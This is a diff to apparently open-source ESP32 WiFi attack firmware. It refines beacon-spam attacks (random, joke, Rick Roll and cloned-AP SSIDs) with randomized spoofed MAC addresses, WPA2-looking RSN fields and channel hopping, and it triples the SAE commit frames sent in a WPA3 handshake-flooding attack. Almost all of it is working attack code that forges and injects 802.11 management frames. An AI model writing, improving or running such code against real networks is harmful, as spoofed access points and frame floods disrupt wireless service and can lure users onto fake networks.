@@ -112,9 +112,9 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 		for (int i = 0; i < 55; i++) sendProbeAttack();
 	}
 	else if (attack_mode == WIFI_ATTACK_RND_BEACON) {
-		static long long execttime = millis();
+		static long long exectime = millis();
 		sendBeaconRandomSSID();
-		while (millis() - execttime < 1000) {
+		if (millis() - exectime < 1000) {
 			#ifdef BOARD_ESP32_C5_DEVKIT_C1
 				set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
 			#else
@@ -122,13 +122,24 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 			#endif
 			changeChannel();
 			vTaskDelay(1 / portTICK_PERIOD_MS);
-			execttime = millis();
+			exectime = millis();
 		}
 	}
 	else if (attack_mode == WIFI_ATTACK_FUN_BEACON) {
 		for (int i = 0; i < 7; i++) {
 			for (int x = 0; x < GET_SIZE(funny_ssid_beacon); x++) {
+				static long long exectime = millis();
 				sendCustomESSIDBeacon(funny_ssid_beacon[x]);
+				if (millis() - exectime < 1000) {
+				#ifdef BOARD_ESP32_C5_DEVKIT_C1
+					set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
+				#else
+					set_channel = random(0, 12);
+				#endif
+				changeChannel();
+				vTaskDelay(1 / portTICK_PERIOD_MS);
+				exectime = millis();
+		}
 			}
 		}
 	}
@@ -136,15 +147,37 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 		for (int i = 0; i < 7; i++)
 		{
 			for (int x = 0; x < GET_SIZE(rick_roll); x++)
-				{
-					sendCustomESSIDBeacon(rick_roll[x]);
+			{
+				static long long exectime = millis();
+				sendCustomESSIDBeacon(rick_roll[x]);
+				if (millis() - exectime < 1000) {
+					#ifdef BOARD_ESP32_C5_DEVKIT_C1
+						set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
+					#else
+						set_channel = random(0, 12);
+					#endif
+					changeChannel();
+					vTaskDelay(1 / portTICK_PERIOD_MS);
+					exectime = millis();
 				}
+			}
 		}
 	}
 	else if (attack_mode == WIFI_ATTACK_AP_BEACON) {
 		for (int i = 0; i < access_points->size(); i++) {
 			if (access_points->get(i).selected) {
-				sendCustomBeacon(access_points->get(i));     
+				static long long exectime = millis();
+				sendCustomBeacon(access_points->get(i));  
+				if (millis() - exectime < 1000) {
+					#ifdef BOARD_ESP32_C5_DEVKIT_C1
+						set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
+					#else
+						set_channel = random(0, 12);
+					#endif
+					changeChannel();
+					vTaskDelay(1 / portTICK_PERIOD_MS);
+					exectime = millis();
+				}   
 			}
 		}
 	}
@@ -1453,7 +1486,10 @@ void WiFiModules::SAEScan(bool attack) {
 	this->sae_scan = !attack;
 
 	if (attack) {
-		this->initMbedtls();
+		if(!initMbedtls()) {
+			Serial.println("[ERROR] Failed to initialize mbedtls for SAE attack!");
+			return;
+		}
 		esp_wifi_init(&cfg);
 	}
 	else esp_wifi_init(&cfg2);
@@ -1836,55 +1872,53 @@ void WiFiModules::sendCustomBeacon(AccessPoint custom_ssid) {
 		return;
 	}
 
-	channelRandom();
-	vTaskDelay(1 / portTICK_PERIOD_MS);  
+	static const uint8_t post_base[] = {
+		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+		0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
+		0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
+		0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
+	};
+
+	//channelRandom();
+	//vTaskDelay(1 / portTICK_PERIOD_MS);  
 
 	// Randomize SRC MAC
-	for (int i = 0; i < 6; i++) {
-		beacon_frame_packet[10 + i] = random(256);
-		beacon_frame_packet[16 + i] = beacon_frame_packet[10 + i];
-	}
-
 	char ESSID[custom_ssid.essid.length() + 1] = {};
 	custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);
 
 	int realLen = strlen(ESSID);
 	int ssidLen = random(realLen, 33);
-	int numSpace = ssidLen - realLen;
-	beacon_frame_packet[37] = ssidLen;
 
-	// Insert my tag
+	int frame_len = 37 + sizeof(post_base) + ssidLen + 1;
+
+	uint8_t temp_frame[frame_len];
+	memcpy(temp_frame, beacon_frame_packet, frame_len);
+
+	temp_frame[10] = temp_frame[16] = (random(256) & 0xFE) | 0x02;
+	temp_frame[11] = temp_frame[17] = random(256);
+	temp_frame[12] = temp_frame[18] = random(256);
+	temp_frame[13] = temp_frame[19] = random(256);
+	temp_frame[14] = temp_frame[20] = random(256);
+	temp_frame[15] = temp_frame[21] = random(256);
+
+	temp_frame[34] = custom_ssid.beacon[0];
+	temp_frame[35] = custom_ssid.beacon[1];
+
+	temp_frame[37] = ssidLen;
+
 	for(int i = 0; i < realLen; i++)
-		beacon_frame_packet[38 + i] = ESSID[i];
+		temp_frame[38 + i] = ESSID[i];
 
-	for(int i = 0; i < numSpace; i++)
-		beacon_frame_packet[38 + realLen + i] = 0x20;
+	for(int i = 0; i < ssidLen - realLen; i++)
+		temp_frame[38 + realLen + i] = 0x20;
 
-	/////////////////////////////
-	
-	beacon_frame_packet[50 + ssidLen] = set_channel;
+	temp_frame[50 + ssidLen] = set_channel;
 
-	const uint8_t* post = nullptr;
-	int post_len = 0;
+	memcpy(temp_frame + (38 + ssidLen), post_base, sizeof(post_base));
 
-	static const uint8_t post_base[] = {
-		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
-		0x03, 0x01, 0x04
-	};
-
-	uint8_t temp[64]; // big enough for worst case
-	post = post_base;
-    post_len = sizeof(post_base);
-
-	memcpy(beacon_frame_packet + (38 + ssidLen), post, post_len);
-
-	beacon_frame_packet[34] = custom_ssid.beacon[0];
-	beacon_frame_packet[35] = custom_ssid.beacon[1];
-	
-
-	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
-	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
-	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
+	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
+	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
+	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
 
 	packet_sent = packet_sent + 3;
 
@@ -1902,38 +1936,42 @@ void WiFiModules::sendCustomESSIDBeacon(const char* ESSID) {
 		return;
 	}
 
-	channelRandom();
-
-	// Randomize SRC MAC
-	for (int i = 0; i < 6; i++) {
-		beacon_frame_packet[10 + i] = random(256);
-		beacon_frame_packet[16 + i] = beacon_frame_packet[10 + i];
-	}
+	static const uint8_t post_base[] = {
+		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+		0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
+		0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
+		0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
+	};
 
 	int ssidLen = strlen(ESSID);
-	beacon_frame_packet[37] = ssidLen;
+
+	int frame_len = 37 + sizeof(post_base) + ssidLen + 1;
+
+	uint8_t temp_frame[frame_len];
+	memcpy(temp_frame, beacon_frame_packet, frame_len);
+
+	temp_frame[10] = temp_frame[16] = (random(256) & 0xFE) | 0x02;
+	temp_frame[11] = temp_frame[17] = random(256);
+	temp_frame[12] = temp_frame[18] = random(256);
+	temp_frame[13] = temp_frame[19] = random(256);
+	temp_frame[14] = temp_frame[20] = random(256);
+	temp_frame[15] = temp_frame[21] = random(256);
+
+	temp_frame[37] = ssidLen;
 
 	// Insert my tag
 	for(int i = 0; i < ssidLen; i++)
-		beacon_frame_packet[38 + i] = ESSID[i];
+		temp_frame[38 + i] = ESSID[i];
 
 	/////////////////////////////
 	
-	beacon_frame_packet[50 + ssidLen] = this->set_channel;
+	temp_frame[50 + ssidLen] = this->set_channel;
 
-	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-						0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
+	memcpy(temp_frame + (38 + ssidLen), post_base, sizeof(post_base));
 
-
-
-	// Add everything that goes after the SSID
-	for(int i = 0; i < 12; i++) 
-		beacon_frame_packet[38 + ssidLen + i] = postSSID[i];
-	
-
-	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
-	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
-	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
+	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
+	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
+	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
 
 	packet_sent = packet_sent + 3;
 
@@ -1988,7 +2026,7 @@ void WiFiModules::sendBeaconRandomSSID() {
 	memcpy(temp_frame + (38 + ssidLen), post_base, post_len);
 
 	esp_err_t res;
-	for (int i = 0; i < 2; i++)	res = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
+	for (int i = 0; i < 2; i++)	res = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
 	
 	packet_sent = packet_sent + 2;
     if (res != ESP_OK)
@@ -2421,7 +2459,9 @@ bool WiFiModules::sendSAECommitFrame(uint8_t target_mac[6], uint8_t src_mac[6]) 
 		current_index++;
 	}
 
-	if (esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) != ESP_OK)
+	if (esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) != ESP_OK ||
+	    esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) != ESP_OK ||
+		esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) != ESP_OK)
 		return false;
 
 	this->data_frames++;
